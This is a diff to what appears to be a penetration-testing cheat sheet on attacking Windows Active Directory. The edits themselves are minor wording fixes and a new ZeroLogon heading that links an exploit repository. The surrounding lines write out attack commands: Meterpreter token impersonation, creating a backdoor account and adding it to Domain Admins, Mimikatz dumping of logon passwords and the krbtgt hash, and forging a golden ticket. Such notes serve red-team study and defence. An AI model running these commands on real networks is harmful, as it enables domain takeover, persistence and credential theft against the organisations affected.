@@ -71,7 +71,7 @@ meterpreter> load incognito
 meterpreter> list tokens -u
 meterpreter> impersonate_token <token name>
 ```
-- Next for persistence, we can add new user and run secretsdump.
+- Next for persistence, we can add new users and run secretsdump.
 ```bash
 meterpreter> net user /add badboy password123 /DOMAIN
 meterpreter> net group "Domain Admins" badboy /ADD /DOMAIN
@@ -129,7 +129,7 @@ sekurlsa:logonpasswords
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
-- Copy SID of the domain and paste it into a safe place
+- Copy the SID of the domain and paste it into a safe place
 - Copy the NTLM hash for the **krbtgt** account and paste it into a safe place
 - Now, generate a golden ticket
 ```powershell
@@ -138,3 +138,7 @@ kerberos::golden /User:Fakeuser /domain:<domain name> /sid:<SID> /krbtgt:<NTLM h
 # Interact with the session using PTT, use cmd:
 misc::cmd
 ```
+# Abusing [ZeroLogon](https://github.com/dirkjanm/CVE-2020-1472)
+
+
+
